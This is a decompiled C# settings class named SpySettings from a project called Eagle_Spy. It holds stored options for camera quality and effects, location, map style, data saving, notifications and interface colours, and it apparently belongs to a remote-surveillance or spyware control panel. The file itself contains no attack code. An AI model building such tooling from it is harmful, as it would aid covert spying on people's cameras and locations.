using System;
using System.Drawing;
using Eagle_Spy.My;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy
{
	// Token: 0x020000AB RID: 171
	[StandardModule]
	internal sealed class SpySettings
	{
		// Token: 0x04000ABE RID: 2750
		public static string FLAGS_PERFORMANCE = MySettingsProperty.Settings.performance;

		// Token: 0x04000ABF RID: 2751
		public static string LOCATION_NOTICETIGHT = MySettingsProperty.Settings.location;

		// Token: 0x04000AC0 RID: 2752
		public static string SOHW_ALERT = MySettingsProperty.Settings.show_alert;

		// Token: 0x04000AC1 RID: 2753
		public static string ENCODING8 = MySettingsProperty.Settings.encoding8;

		// Token: 0x04000AC2 RID: 2754
		public static string DISCONNECTED = MySettingsProperty.Settings.disconnected;

		// Token: 0x04000AC3 RID: 2755
		public static string AUTO_FOCUS = MySettingsProperty.Settings.Auto_focus;

		// Token: 0x04000AC4 RID: 2756
		public static string EFFECTS_CAM = MySettingsProperty.Settings.Effects_CAM;

		// Token: 0x04000AC5 RID: 2757
		public static string STYLE_MAPS = MySettingsProperty.Settings.Style_Maps;

		// Token: 0x04000AC6 RID: 2758
		public static string SAVING_DATA = MySettingsProperty.Settings.Saving_data;

		// Token: 0x04000AC7 RID: 2759
		public static string CAM_Quality = MySettingsProperty.Settings.CAMQuality;

		// Token: 0x04000AC8 RID: 2760
		public static Color DefaultColor_Foreground = Color.White;

		// Token: 0x04000AC9 RID: 2761
		public static Color DefaultColor_Background = Color.FromArgb(40, 40, 40);

		// Token: 0x04000ACA RID: 2762
		public static Color DefaultColor_ColorTitles = Color.Blue;

		// Token: 0x04000ACB RID: 2763
		public static Color DefaultColor_NewColorFiles = Color.Red;

		// Token: 0x04000ACC RID: 2764
		public static bool NOTI_SOUND = MySettingsProperty.Settings.NOTI_SOUND;

		// Token: 0x04000ACD RID: 2765
		public static string FLAGS_Visible = MySettingsProperty.Settings.Flags_Visible;

		// Token: 0x04000ACE RID: 2766
		public static string FLAGS_Size = MySettingsProperty.Settings.Flags_Size;

		// Token: 0x04000ACF RID: 2767
		public static string NOTI_Round = MySettingsProperty.Settings.Round;

		// Token: 0x04000AD0 RID: 2768
		public static string SC_Status = MySettingsProperty.Settings.SStatus_Visible;

		// Token: 0x04000AD1 RID: 2769
		public static string FM_IC_Size = MySettingsProperty.Settings.FM_IC_Size;

		// Token: 0x04000AD2 RID: 2770
		public static object vRemoving_Duplicates = MySettingsProperty.Settings.Removing_Duplicates;

		// Token: 0x04000AD3 RID: 2771
		public static string ColumnsIndex = "0123456789";

		// Token: 0x04000AD4 RID: 2772
		public static int T_Interval = 1;
	}
}
